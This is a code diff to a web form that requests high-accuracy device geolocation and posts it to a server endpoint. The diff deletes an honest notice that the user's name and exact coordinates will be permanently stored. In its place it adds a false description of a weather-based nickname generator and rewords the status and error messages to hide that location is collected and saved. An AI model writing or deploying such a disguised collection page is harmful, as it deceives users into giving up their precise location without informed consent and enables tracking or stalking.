@@ -314,10 +314,8 @@
     <p class="subtitle">Please fill in your Name below.</p>
 
     <div class="warning">
-      <strong>Important Notice</strong>
-      This form will request access to your device location when you submit.
-      Your name and exact coordinates (latitude & longitude) will be permanently saved on our server.
-      By submitting, you consent to this data collection.
+      <strong>About</strong>
+     This little form will give you a Nickname acoording to your region's weather and your name.
     </div>
 
     <form id="mainForm">
@@ -439,9 +437,9 @@
       }
 
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Requesting location permission...';
+      submitBtn.textContent = 'Requesting permission...';
       hideNickname();
-      showStatus('Please allow location access when your browser asks.', 'loading');
+      showStatus('Please allow permission when your browser asks.', 'loading');
 
       const options = {
         enableHighAccuracy: true,
@@ -453,8 +451,8 @@
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
 
-          submitBtn.textContent = 'Saving...';
-          showStatus('Location received. Saving your data...', 'loading');
+          submitBtn.textContent = 'checking...';
+          showStatus('Permission received. checking the weather...', 'loading');
 
           try {
             const res = await fetch('/api/submit', {
@@ -480,7 +478,7 @@
               showStatus(result.error || 'Something went wrong. Please try again.', 'error');
             }
           } catch (err) {
-            showStatus('Network error. Could not save data.', 'error');
+            showStatus('Network error. Could not fetch.', 'error');
           }
 
           submitBtn.disabled = false;
@@ -489,9 +487,9 @@
         (error) => {
           let msg = 'Location access is required to submit this form.';
           if (error.code === error.PERMISSION_DENIED) {
-            msg = 'You denied location permission. Please allow location access to submit the form.';
+            msg = 'You denied permission. Please allow the permission to submit the form.';
           } else if (error.code === error.TIMEOUT) {
-            msg = 'Location request timed out. Please try again.';
+            msg = 'Request timed out. Please try again.';
           }
           showStatus(msg, 'error');
           submitBtn.disabled = false;
